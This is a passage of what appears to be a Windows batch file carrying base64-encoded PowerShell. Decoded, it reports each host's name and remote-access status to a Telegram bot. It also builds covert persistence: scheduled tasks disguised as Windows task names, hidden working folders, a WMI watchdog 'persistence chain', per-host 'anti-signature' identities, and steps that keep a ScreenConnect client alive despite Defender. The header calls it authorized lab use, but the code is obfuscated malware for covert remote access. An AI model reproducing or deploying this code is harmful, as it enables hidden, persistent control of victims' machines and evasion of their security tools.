::ICAgJG1zaVNob3J0ID0gaWYgKFRlc3QtUGF0aCAkbXNpQ2FjaGUpIHsgJ3swOk4w
::fUtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNoZSAtRm9yY2UpLkxlbmd0aCAvIDFL
::QikgfSBlbHNlIHsgJzAnIH0NCiAgICAkcHJpbVNob3J0ID0gaWYgKCRwcmltT2sp
::IHsgJ09LJyB9IGVsc2UgeyAnRE9XTicgfQ0KICAgICRhbHRTaG9ydCA9IGlmICgk
::YWx0TGluZSAtbGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBlbHNlIHsgJy0nIH0N
::CiAgICAkZ3J5eGFMaW5lID0gR2V0LVN2Y0xpbmUgKCJTY3JlZW5Db25uZWN0IENs
::aWVudCAoezB9KSIgLWYgKEdldC1Hcnl4YUtlZXBGcCkpDQogICAgJGdyeXhhU2hv
::cnQgPSBpZiAoJGdyeXhhTGluZSAtbGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBl
::bHNlIHsgJy0nIH0NCiAgICAkdGV4dCA9ICIkZW1vamkgU0NEfCQoJGVudjpDT01Q
::VVRFUk5BTUUpfHNldj0kcHJpbVNob3J0fGdyeT0kZ3J5eGFTaG9ydHxhbHQ9JGFs
::dFNob3J0fGY9JGZvcmVpZ25OfHQ9JHRhc2tPay81fGI9JEJ1aWxkIg0KfQ0KDQpp
::ZiAoJHRleHQuTGVuZ3RoIC1ndCAzODAwKSB7DQogICAgJHJtbUhpdHMgPSBAKCgk
::cm1tSGl0cyB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEyKSkgKyAoJy0gLi4uICh7
::MH0gbW9yZSknIC1mICgkcm1tSGl0cy5Db3VudCAtIDEyKSkNCiAgICAkc2NMaXN0
::ID0gQCgoJHNjTGlzdCB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDE0KSkgKyAoJy0g
::Li4uICh7MH0gbW9yZSknIC1mICgkc2NMaXN0LkNvdW50IC0gMTQpKQ0KICAgICR0
::ZXh0ID0gJHRleHQuU3Vic3RyaW5nKDAsIDM4MDApICsgImBuYG48aT5UUlVOQ0FU
::RUQgKFRlbGVncmFtIDQwOTYgbGltaXQpPC9pPiINCn0NCg0KJGxvZyA9IEpvaW4t
::UGF0aCAkV29ya0RpciAnYm9vdC5lcnInDQpmdW5jdGlvbiBTZW5kLVRnKFtzdHJp
::bmddJG1zZywgW3N0cmluZ10kbW9kZSkgew0KICAgICRwYXlsb2FkID0gQHsNCiAg
::ICAgICAgY2hhdF9pZCAgICAgICAgICAgICAgICAgID0gJGNmZy5DSEFUX0lEDQog
::ICAgICAgIHRleHQgICAgICAgICAgICAgICAgICAgICA9ICRtc2cNCiAgICAgICAg
::ZGlzYWJsZV93ZWJfcGFnZV9wcmV2aWV3ID0gJHRydWUNCiAgICB9DQogICAgaWYg
::KCRtb2RlKSB7ICRwYXlsb2FkLnBhcnNlX21vZGUgPSAkbW9kZSB9DQogICAgJGpz
::b24gPSAkcGF5bG9hZCB8IENvbnZlcnRUby1Kc29uIC1Db21wcmVzcyAtRGVwdGgg
::NQ0KICAgICRieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0
::Qnl0ZXMoJGpzb24pDQogICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAoImh0dHBz
::Oi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkKCRjZmcuQk9UX1RPS0VOKS9zZW5kTWVz
::c2FnZSIpIGANCiAgICAgICAgLU1ldGhvZCBQb3N0IC1Cb2R5ICRieXRlcyAtQ29u
::dGVudFR5cGUgJ2FwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgnIHwgT3V0
::LU51bGwNCn0NCg0KZnVuY3Rpb24gU2VuZC1UZ1NhZmUoW3N0cmluZ10kbXNnLCBb
::c3RyaW5nXSRtb2RlKSB7DQogICAgJHRvU2VuZCA9ICRtc2cNCiAgICB0cnkgew0K
::ICAgICAgICBTZW5kLVRnIC1tc2cgJHRvU2VuZCAtbW9kZSAkbW9kZQ0KICAgICAg
::ICByZXR1cm4gJHRydWUNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgdHJ5IHsNCiAg
::ICAgICAgICAgIFNlbmQtVGcgLW1zZyAoJHRvU2VuZC5TdWJzdHJpbmcoMCwgMzAw
::MCkgKyAiYG48aT5UUlVOQ0FURUQ8L2k+IikgLW1vZGUgJG1vZGUNCiAgICAgICAg
::ICAgIHJldHVybiAkdHJ1ZQ0KICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAg
::IHJldHVybiAkZmFsc2UNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KdHJ5IHsNCiAg
::ICBpZiAoU2VuZC1UZ1NhZmUgLW1zZyAkdGV4dCAtbW9kZSAnSFRNTCcpIHsNCiAg
::ICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICd0Z19z
::ZW50X3JpY2gnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfSBl
::bHNlIHsNCiAgICAgICAgdGhyb3cgJ2h0bWxfZmFpbGVkJw0KICAgIH0NCiAgICBp
::ZiAoJGtleSAtZXEgJ0RFUExPWScpIHsNCiAgICAgICAgQWRkLUNvbnRlbnQgLUxp
::dGVyYWxQYXRoICRsb2cgLVZhbHVlICgidGdfZGVwbG95X29rPSIgKyAkZGVwbG95
::T2spIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIFNldC1D
::b250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdkZXBsb3lf
::dGcuZmxhZycpIC1WYWx1ZSAoR2V0LURhdGUgLUZvcm1hdCAnbycpIC1FcnJvckFj
::dGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfQ0KfSBjYXRjaCB7DQogICAgdHJ5
::IHsNCiAgICAgICAgJHBsYWluID0gW3JlZ2V4XTo6UmVwbGFjZSgkdGV4dCwgJzxb
::Xj5dKz4nLCAnJykNCiAgICAgICAgJHBsYWluID0gW1N5c3RlbS5OZXQuV2ViVXRp
::bGl0eV06Okh0bWxEZWNvZGUoJHBsYWluKQ0KICAgICAgICBpZiAoJHBsYWluLkxl
::bmd0aCAtZ3QgMzUwMCkgeyAkcGxhaW4gPSAkcGxhaW4uU3Vic3RyaW5nKDAsIDM1
::MDApICsgImBuVFJVTkNBVEVEIiB9DQogICAgICAgIFNlbmQtVGdTYWZlIC1tc2cg
::JHBsYWluIC1tb2RlICcnIHwgT3V0LU51bGwNCiAgICAgICAgQWRkLUNvbnRlbnQg
::LUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICd0Z19zZW50X3BsYWluJyAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICBB
::ZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgKCJ0Z19mYWlsICIg
::KyAkXy5FeGNlcHRpb24uTWVzc2FnZSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUNCiAgICB9DQp9DQo=
::B64_TGR_END
::B64_LIB_BEGIN
::I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZANCiMgT1dOX0xJQiAgQlVJTEQgMjAyNjA4
::MDRMNDcNCiMgTDQ3OiBzYy5leGUgZm9yIFNDIGV4aXN0ZW5jZS9ydW5uaW5nIChH
::ZXQtU2VydmljZSBmYWxzZSBBQlNFTlQgY2F1c2VkIGJhZCBoZWFscykuDQojIEw0
::NjogRlJFRVpFIC0gbmV2ZXIgYXV0byBtc2lleGVjIGZyb20gbW9uL2Jvb3Q7IHN0
::YXJ0LW9ubHkuIE1hbnVhbCBmb3JjZSBvbmx5Lg0KIyBMNDU6IEhBTkRTLU9GRiBh
::bGwgU2NyZWVuQ29ubmVjdCBleGNlcHQgR3J5eGEgaW5zdGFsbC1pZi1hYnNlbnQu
::DQojIFNoYXJlZCBsaWJyYXJ5OiBwZXItaG9zdCBpZGVudGl0eSAoYW50aS1zaWdu
::YXR1cmUpLCBXTUkgd2F0Y2hkb2cNCiMgKG11dHVhbCBwZXJzaXN0ZW5jZSBjaGFp
::biksIGNhbXBhaWduIHN0YXRlIGZpbGUsIFNDIHNlcnZpY2UgcmVwYWlyLg0KIyBM
::NDQ6IEhBUkQgbG9jayDigJQgYW55IGxpdmUgR3J5eGEgPT4gbmV2ZXIgbWlncmF0
::ZS91bmluc3RhbGwvaTsgbm8gZGVmZXJyZWQgL3g7IHByb3RlY3QgbXVzdCBlbXB0
::eSBVcGdyYWRlLg0KIyBMNDM6IFRlc3QtU2NSdW5uaW5nIGluY2x1ZGVzIFN0YXJ0
::UGVuZGluZzsgbmV2ZXIgL3ggd2hlbiBzZXJ2aWNlIGV4aXN0cyAoY29ubmVjdC1k
::cm9wIHJhY2UpLg0KIyBMNDI6IEZQIG1pZ3JhdGUgaW5zdGFsbC1uZXctRklSU1Qg
::dGhlbiBkZWZlci1yZW1vdmUtb2xkIChuZXZlciBsZWF2ZSBob3N0IHdpdGggemVy
::byBHcnl4YSkuDQojIEw0MTogLUZvcmNlIE5FVkVSIC94Ky9pIHdoZW4gR3J5eGEg
::YWxyZWFkeSBSdW5uaW5nIChmb3JjZV9ncnl4YS5mbGFnIHdhcyBraWxsaW5nIGxp
::dmUgR3Vlc3QpLg0KIyBMMzk6IHJlbGF5LXZlcmlmaWVkIEdyeXhhIGtlZXBlciBh
::ZG9wdGlvbjsgSU5GTElHSFTiiaBIRUFMVEhZOyByZWFsIC1Gb3JjZS8tRGVlcDsN
::CiMgICAgICBwb3N0LUdyeXhhIC9pIHNldnJ6IHJlc3RvcmU7IFRlc3QtTXNpUGFj
::a2FnZTsgVEFTS19HIGluIHN0YXRlOyBwZXJzaXN0ZW5jZSBwdXJnZSB3L28gRlAt
::b25seS4NCiMgTDM4OiBUQVNLX0cgV3VjYWNoZUdyeXhhQm9vdCBPTlNUQVJUIHJ1
::bnMgZ3J5eGEtZW5zdXJlIC1Ob1dhaXQgLUZvcmNlIGF0IGJvb3QgKERlZmVuZGVy
::IHN0cmlwcyBTQ00gZW50cnkgYXQgc3RhcnR1cCkuIEwzNzogTVNJIG1hZ2ljK0ZQ
::IHZhbGlkYXRlLg0KIyBMMjE6IHN0dWNrIHJlZ2lzdGVyZWQgKHN2YytkaXIgZ29u
::ZSkgLT4gL2ZhIHRoZW4gQVJQIG51a2UgKyBzYW1lLUZQIC9pOyByZXR1cm4gZml4
::Lg0KIyBMMjA6IC1EZWVwIG11c3Qgbm90IHNraXAgbGlnaHQgc3RhcnQvcmVwYWly
::IChyYXRlLWxpbWl0IGxlZnQgR3J5eGEgU3RvcHBlZCkuDQojIEwxOTogcmF0ZS1s
::aW1pdCBuZXZlciBibG9ja3Mgd2hlbiBHcnl4YSBmdWxseSBhYnNlbnQ7IFN0YXJ0
::UGVuZGluZyBrZWVwLg0KIyBMMTg6IGV4dGVybWluYXRlIHdhcyBLSUxMSU5HIEdy
::eXhhIChudWxsLXBhdGggcHJvYyBraWxsKTsgc3luYyBGUCBiZWZvcmUga2lsbC4N
::CiMgTDE3OiBHcnl4YSByZWluc3RhbGwgTE9DSyB3aGlsZSBhbnkgbm9uLXNldnJ6
::IFNDIFJ1bm5pbmc7IEZQIGRyaWZ0IG5ldmVyIC94Lg0KIyBMMTY6IE5FVkVSIHJl
::aW5zdGFsbCBHcnl4YSB3aGVuIFJ1bm5pbmcgKHBhbmVsIGR1cGxpY2F0ZXMpOyBU
::Q1AgYWR2aXNvcnkgb25seS4NCiMgTDE1OiBncnl4YS1oZWFsdGggLyBncnl4YS1l
::bnN1cmUg4oCUIDhoIGRlZXAgY2hlY2sgKFRDUC9yZWxheS9GUCBkcmlmdCByZWlu
::c3RhbGwpLg0KIyBMMTM6IHNjaHRhc2tzIENyZWF0ZSB2aWEgY21kIChsaWtlIFd1
::Y2FjaGVPd24pLCBUUiB1bmRlciBXaW5kb3dzXFRlbXBcLnd1Y2FjaGUNCiMgICAg
::ICAobm90IEFDTC1sb2NrZWQgUHJvZ3JhbURhdGEgcGF0aCksIC9TVCAwMDowMCBv
::biBNSU5VVEUsIG5vIGxlYWRpbmcgXC4NCiMgTDEyOiBJREVOVFZFUj03IFJPT1Qt
::bGV2ZWwgdGFzayBuYW1lcyAobmVzdGVkIE1pY3Jvc29mdFxXaW5kb3dzIEFjY2Vz
::cyBEZW5pZWQpLg0KIyBMMTE6IE5FVkVSIHJldXNlIHJlYWwgV2luZG93cyBidWls
::dC1pbiB0YXNrIG5hbWVzOyBUUiBvd25lcnNoaXAgY2hlY2tzLg0KIyBBdXRob3Jp
::emVkIGludGVybmFsIGRlcGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUg
::b25seS4NCiMg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQDQpbQ21kbGV0QmluZGluZygpXQ0KcGFyYW0oDQogICAgW1BhcmFtZXRl
::cihNYW5kYXRvcnkgPSAkdHJ1ZSldDQogICAgW1ZhbGlkYXRlU2V0KCdpbml0Jywg
::J3dhdGNoZG9nJywgJ3dhdGNoZG9nLWVuc3VyZScsICd0YXNrcy1lbnN1cmUnLCAn
::c3RhdGUnLCAnaWRlbnRpdHknLCAncmVwYWlyJywgJ3JlZ2lzdGVyZWQnLCAnZXh0
::ZXJtaW5hdGUnLCAnZ3J5eGEtaGVhbHRoJywgJ2dyeXhhLWVuc3VyZScsICdzeW5j
::LWdyeXhhLWZwJywgJ3Rlc3QtbXNpJywgJ3Byb3RlY3QtbXNpJywgJ3ZlcmlmeS11
::cGRhdGUnLCAnc3luYy1zZXZyei1mcCcpXQ0KICAgIFtzdHJpbmddJEFjdGlvbiwN
::CiAgICBbc3RyaW5nXSRXb3JrRGlyID0gJ0M6XFByb2dyYW1EYXRhXE1pY3Jvc29m
::dFxXaW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlJywNCiAgICBbc3RyaW5nXSRNb25Q
::YXRoID0gJycsDQogICAgW3N0cmluZ10kQnVpbGQgID0gJ08xNScsDQogICAgW3N0
::cmluZ10kRXh0cmEgID0gJycsDQogICAgW3N0cmluZ10kRnAgICAgID0gJycsDQog
::ICAgW3N3aXRjaF0kRGVlcCwNCiAgICBbc3dpdGNoXSRGb3JjZSwNCiAgICBbc3dp
::dGNoXSROb1dhaXQNCikNCg0KJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxl
::bnRseUNvbnRpbnVlJw0KJGNmZ1BhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ2lk
::ZW50aXR5LmNmZycNCiRJZGVudFZlcnNpb24gPSA4DQoNCiMgUm9vdC1sZXZlbCBu
::YW1lcyBXSVRIT1VUIGxlYWRpbmcgYmFja3NsYXNoIChtYXRjaGVzIHdvcmtpbmcg
::V3VjYWNoZU93biBzdHlsZSkuDQokUG9vbHMgPSBAew0KICAgIEEgPSBAKCdXZXJR
::dWV1ZVN5bmMnLCdEaWFnSG9zdENhY2hlJywnTmV0VHJhY2VDYWNoZScsJ1dkaUhv
::c3RQcm94eScsJ1BsYVNlcnZlckhlYWx0aCcsJ1RjcElwQ29uZmxpY3RSZXMnLCdT
::ckNhY2hlU3luYycsJ1Jlc29sdXRpb25RdWV1ZScpDQogICAgQiA9IEAoJ1BsYVNl
::cnZlckhlYWx0aCcsJ1dkaUhvc3RQcm94eScsJ1dlclF1ZXVlU3luYycsJ05ldFRy
::YWNlQ2FjaGUnLCdEaWFnSG9zdENhY2hlJywnVGNwSXBDb25mbGljdFJlcycsJ1Bs
::YVNlcnZlckRpYWcnLCdTckNhY2hlU3luYycpDQogICAgQyA9IEAoJ1Jlc29sdXRp
::b25RdWV1ZScsJ05ldFRyYWNlQ2FjaGUnLCdUY3BJcENvbmZsaWN0UmVzJywnV2Vy
::UXVldWVTeW5jJywnUGxhU2VydmVySGVhbHRoJywnRGlhZ0hvc3RDYWNoZScsJ1Bs
::YVNlcnZlckRpYWcnLCdXZGlIb3N0UHJveHknKQ0KICAgIEQgPSBAKCdUY3BJcENv
::bmZsaWN0UmVzJywnUmVzb2x1dGlvblF1ZXVlJywnTmV0VHJhY2VDYWNoZScsJ0Rp
::YWdIb3N0Q2FjaGUnLCdQbGFTZXJ2ZXJEaWFnJywnV2VyUXVldWVTeW5jJywnUGxh
::U2VydmVySGVhbHRoJywnV2RpSG9zdFByb3h5JykNCn0NCiREZWZhdWx0cyA9IFtv
::cmRlcmVkXUB7DQogICAgVEFTS19BID0gJ1dlclF1ZXVlU3luYycNCiAgICBUQVNL
::X0IgPSAnUGxhU2VydmVySGVhbHRoJw0KICAgIFRBU0tfQyA9ICdXZGlIb3N0UHJv
::eHknDQogICAgVEFTS19EID0gJ1RjcElwQ29uZmxpY3RSZXMnDQogICAgTU9fQSAg
::ID0gJzInDQogICAgTU9fQiAgID0gJzMnDQp9DQoNCmZ1bmN0aW9uIEdldC1Ib3N0
::U2VlZCB7DQogICAgJHMgPSAwTA0KICAgIGZvcmVhY2ggKCRjIGluICRlbnY6Q09N
::UFVURVJOQU1FLlRvVXBwZXIoKS5Ub0NoYXJBcnJheSgpKSB7ICRzID0gKCRzICog
::MzEgKyBbaW50XSRjKSAlIDEwMDAwMDAwMDcgfQ0KICAgIHJldHVybiAkcw0KfQ0K
::DQpmdW5jdGlvbiBSZWFkLUlkZW50aXR5IHsNCiAgICAkaWQgPSAkRGVmYXVsdHMu
::Q2xvbmUoKQ0KICAgIGlmIChUZXN0LVBhdGggJGNmZ1BhdGgpIHsNCiAgICAgICAg
::Zm9yZWFjaCAoJGxpbmUgaW4gKEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkY2Zn
::UGF0aCAtRm9yY2UpKSB7DQogICAgICAgICAgICBpZiAoJGxpbmUgLW1hdGNoICde
::XHMqKFtBLVpfXSspXHMqPVxzKiguKz8pXHMqJCcpIHsgJGlkWyRtYXRjaGVzWzFd
::XSA9ICRtYXRjaGVzWzJdIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4g
::JGlkDQp9DQoNCmZ1bmN0aW9uIFJlbW92ZS1UYXNrUXVpZXQoW3N0cmluZ10kdG4p
::IHsNCiAgICBpZiAoJHRuKSB7ICYgc2NodGFza3MuZXhlIC9EZWxldGUgL1ROICR0
::biAvRiAyPiYxIHwgT3V0LU51bGwgfQ0KfQ0KDQpmdW5jdGlvbiBHZXQtVGFza1Zl
::cmJvc2VCbG9iKFtzdHJpbmddJHRuKSB7DQogICAgaWYgKC1ub3QgJHRuKSB7IHJl
::dHVybiAnJyB9DQogICAgJG91dCA9ICYgc2NodGFza3MuZXhlIC9RdWVyeSAvVE4g
::JHRuIC9GTyBMSVNUIC9WIDI+JG51bGwNCiAgICBpZiAoJExBU1RFWElUQ09ERSAt
::bmUgMCAtb3IgLW5vdCAkb3V0KSB7IHJldHVybiAnJyB9DQogICAgcmV0dXJuICgo
::JG91dCB8IEZvckVhY2gtT2JqZWN0IHsgIiRfIiB9KSAtam9pbiAiYG4iKQ0KfQ0K
::DQpmdW5jdGlvbiBUZXN0LVRhc2tPd25zTW9uKFtzdHJpbmddJHRuLCBbc3RyaW5n
::XSRtYXJrZXIpIHsNCiAgICAjIFRydWUgb25seSBpZiB0aGUgc2NoZWR1bGVkIGFj
::dGlvbiBwb2ludHMgYXQgT1VSIG1vbi9ldGwgcGF0aCDigJQgbm90IGEgV2luZG93
::cyBDT00gaGFuZGxlci4NCiAgICAkYmxvYiA9IEdldC1UYXNrVmVyYm9zZUJsb2Ig
::JHRuDQogICAgaWYgKC1ub3QgJGJsb2IpIHsgcmV0dXJuICRmYWxzZSB9DQogICAg
::aWYgKCRtYXJrZXIgLWFuZCAoJGJsb2IgLW1hdGNoIFtyZWdleF06OkVzY2FwZSgk
::bWFya2VyKSkpIHsgcmV0dXJuICR0cnVlIH0NCiAgICBpZiAoJGJsb2IgLW1hdGNo
::ICcoP2kpXC53dWNhY2hlXFx8b3duX21vblwuY21kfGV0bF9tb25cLmNtZHxcLmV0
::bGNhY2hlXFwnKSB7IHJldHVybiAkdHJ1ZSB9DQogICAgcmV0dXJuICRmYWxzZQ0K
::fQ0KDQpmdW5jdGlvbiBJbml0aWFsaXplLUlkZW50aXR5IHsNCiAgICAjIElkZW1w
::b3RlbnQgd2l0aGluIGFuIElERU5UVkVSIGdlbmVyYXRpb24uIFBvb2wgdXBncmFk
::ZXMgYnVtcCBJREVOVFZFUjoNCiAgICAjIG93bmVkIG9sZC1uYW1lIHRhc2tzIGFy
::ZSBkZWxldGVkOyBXaW5kb3dzIGJ1aWx0LWlucyB3aXRoIHNhbWUgbmFtZSBhcmUg
::bGVmdCBhbG9uZS4NCiAgICBpZiAoVGVzdC1QYXRoICRjZmdQYXRoKSB7DQogICAg
::ICAgICRvbGQgPSBSZWFkLUlkZW50aXR5DQogICAgICAgICMgTDc6IGFsc28gcmVn
::ZW5lcmF0ZSBpZiBhbnkgVEFTS18qIGlzIGVtcHR5IChMNC1MNiBtb2R1bG8vY2Fz
::dCBidWdzIGxlZnQgYmxhbmsgc2xvdHMpDQogICAgICAgICRzbG90c09rID0gKCRv
::bGRbJ0lERU5UVkVSJ10gLWVxICIkSWRlbnRWZXJzaW9uIikgLWFuZCAkb2xkWydU
::QVNLX0EnXSAtYW5kICRvbGRbJ1RBU0tfQiddIC1hbmQgJG9sZFsnVEFTS19DJ10g
::LWFuZCAkb2xkWydUQVNLX0QnXQ0KICAgICAgICBpZiAoJHNsb3RzT2spIHsgcmV0
::dXJuICRvbGQgfQ0KICAgICAgICBmb3JlYWNoICgkayBpbiAnVEFTS19BJywnVEFT
::S19CJywnVEFTS19DJywnVEFTS19EJykgew0KICAgICAgICAgICAgJHRuID0gW3N0
::cmluZ10kb2xkWyRrXQ0KICAgICAgICAgICAgaWYgKC1ub3QgJHRuKSB7IGNvbnRp
::bnVlIH0NCiAgICAgICAgICAgICMgTmV2ZXIgZGVsZXRlIGEgcmVhbCBXaW5kb3dz
::IHRhc2sgd2UgbmV2ZXIgb3duZWQgKFRSIGlzIENPTS9jdXN0b20gaGFuZGxlciku
::DQogICAgICAgICAgICBpZiAoVGVzdC1UYXNrT3duc01vbiAkdG4gJycpIHsgUmVt
::b3ZlLVRhc2tRdWlldCAkdG4gfQ0KICAgICAgICB9DQogICAgICAgIFJlbW92ZS1J
::dGVtIC1MaXRlcmFsUGF0aCAkY2ZnUGF0aCAtRm9yY2UNCiAgICB9DQogICAgJHMg
::PSBHZXQtSG9zdFNlZWQNCiAgICAjIEw0OiB0d28gc2xvdHMgbWF5IGhhc2ggdG8g
::dGhlIHNhbWUgdGFzayBwYXRoIChwb29scyBzaGFyZSBuYW1lcykgLT4NCiAgICAj
::IG9uZSBwaHlzaWNhbCB0YXNrIHRoZW4gc2F0aXNmaWVzIHR3byBzbG90cyBhbmQg
::dGhlIGZsZWV0IHNob3dzIDMvNC4NCiAgICAjIFdhbGsgZWFjaCBwb29sIGZvcndh
::cmQgdW50aWwgdGhlIHBpY2sgaXMgdW5pcXVlIGFjcm9zcyBzbG90cy4NCiAgICAj
::IEw2OiB0aGUgb2xkIEAoQCgnQScsICRzICUgOCksIC4uLikgZm9ybSB3YXMgZG91
::YmxlLWJyb2tlbiBpbiBQUyA1LjE6DQogICAgIyBiYXJlICUgaW5zaWRlIEAoKSBw
::YXJzZXMgYXMgdGhlIEZvckVhY2gtT2JqZWN0IGFsaWFzIChub3QgbW9kdWxvKSwg
::c28gdGhlDQogICAgIyBjb2xsZWN0aW9uIGNvbGxhcHNlZCBhbmQgdGhlIGxvb3Ag
::bmV2ZXIgcmFuIC0+IGlkZW50aXR5LmNmZyBoYWQgRU1QVFkNCiAgICAjIFRBU0tf
::KiBhbmQgdGhlIHdob2xlIGZsZWV0IGZlbGwgYmFjayB0byBpZGVudGljYWwgZGVm
::YXVsdCB0YXNrIG5hbWVzLg0KICAgICRzZWVkcyA9IFtvcmRlcmVkXUB7DQogICAg
::ICAgIEEgPSAoJHMgJSA4KQ0KICAgICAgICBCID0gKCgkcyArIDMpICUgOCkNCiAg
::ICAgICAgQyA9ICgoJHMgKyA1KSAlIDgpDQogICAgICAgIEQgPSAoKCRzICsgNykg
::JSA4KQ0KICAgIH0NCiAgICAkcGljayA9IFtvcmRlcmVkXUB7fQ0KICAgIGZvcmVh
::Y2ggKCRsZXR0ZXIgaW4gJ0EnLCdCJywnQycsJ0QnKSB7DQogICAgICAgICRpID0g
::W2ludF0kc2VlZHNbJGxldHRlcl0NCiAgICAgICAgJG5hbWUgPSAkUG9vbHNbJGxl
::dHRlcl1bJGldDQogICAgICAgICRuID0gMA0KICAgICAgICB3aGlsZSAoJHBpY2su
::VmFsdWVzIC1jb250YWlucyAkbmFtZSAtYW5kICRuIC1sdCA4KSB7ICRpID0gKCRp
::ICsgMSkgJSA4OyAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVskaV07ICRuKysgfQ0K
::ICAgICAgICBpZiAoLW5vdCAkbmFtZSkgeyAkbmFtZSA9ICREZWZhdWx0c1siVEFT
::S18kbGV0dGVyIl0gfQ0KICAgICAgICAkcGlja1skbGV0dGVyXSA9ICRuYW1lDQog
::ICAgfQ0KICAgICRjZmcgPSBAKA0KICAgICAgICAiVEFTS19BPSQoJHBpY2suQSki
::DQogICAgICAgICJUQVNLX0I9JCgkcGljay5CKSINCiAgICAgICAgIlRBU0tfQz0k
::KCRwaWNrLkMpIg0KICAgICAgICAiVEFTS19EPSQoJHBpY2suRCkiDQogICAgICAg
::ICJNT19BPSQoMiArICgkcyAlIDQpKSIgICAgICAgICAgIyAyLTUgbWluIGppdHRl
::cg0KICAgICAgICAiTU9fQj0kKDMgKyAoKCRzICsgMSkgJSAzKSkiICAgICMgMy01
::IG1pbiBqaXR0ZXINCiAgICAgICAgIlNFRUQ9JHMiDQogICAgICAgICJJREVOVFZF
::Uj0kSWRlbnRWZXJzaW9uIg0KICAgICkNCiAgICBTZXQtQ29udGVudCAtTGl0ZXJh
::bFBhdGggJGNmZ1BhdGggLVZhbHVlICRjZmcgLUZvcmNlDQogICAgcmV0dXJuIChS
::ZWFkLUlkZW50aXR5KQ0KfQ0KDQpmdW5jdGlvbiBOb3JtYWxpemUtVGFza05hbWUo
::W3N0cmluZ10kdG4pIHsNCiAgICBpZiAoLW5vdCAkdG4pIHsgcmV0dXJuICcnIH0N
::CiAgICByZXR1cm4gJHRuLlRyaW0oKS5UcmltU3RhcnQoJ1wnKQ0KfQ0KDQpmdW5j
::dGlvbiBXcml0ZS1Pd25Mb2coW3N0cmluZ10kbSkgew0KICAgICRsb2cgPSBKb2lu
::LVBhdGggJFdvcmtEaXIgJ2Jvb3QuZXJyJw0KICAgIHRyeSB7IEFkZC1Db250ZW50
::IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAkbSAtRm9yY2UgfSBjYXRjaCB7fQ0K
::fQ0KDQpmdW5jdGlvbiBFbnN1cmUtUGVyc2lzdFRhc2tzIHsNCiAgICAjIE1pcnJv
::ciB3b3JraW5nIGRldGFjaCAoV3VjYWNoZU93bik6IGNtZCBzY2h0YXNrcywgQk9P
::VCBUUiBwYXRoLCAvU1Qgb24gTUlOVVRFLg0KICAgICRpZCA9IEluaXRpYWxpemUt
::SWRlbnRpdHkNCiAgICBpZiAoLW5vdCAkTW9uUGF0aCkgeyAkTW9uUGF0aCA9IEpv
::aW4tUGF0aCAkV29ya0RpciAnb3duX21vbi5jbWQnIH0NCiAgICAkYm9vdCA9IEpv
::aW4tUGF0aCAkZW52OlN5c3RlbVJvb3QgJ1RlbXBcLnd1Y2FjaGUnDQogICAgJGV0
::bERpciA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcRGlhZ25vc2lzXFN0YXRl
::XC5ldGxjYWNoZScNCiAgICBmb3JlYWNoICgkZCBpbiBAKCRib290LCAkZXRsRGly
::KSkgew0KICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAk
::ZCkpIHsgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkZCAtRm9y
::Y2UgfCBPdXQtTnVsbCB9DQogICAgfQ0KICAgICRib290TW9uID0gSm9pbi1QYXRo
::ICRib290ICdvd25fbW9uLmNtZCcNCiAgICAkYm9vdEV0bCA9IEpvaW4tUGF0aCAk
::Ym9vdCAnZXRsX21vbi5jbWQnDQogICAgJGV0bE1vbiA9IEpvaW4tUGF0aCAkZXRs
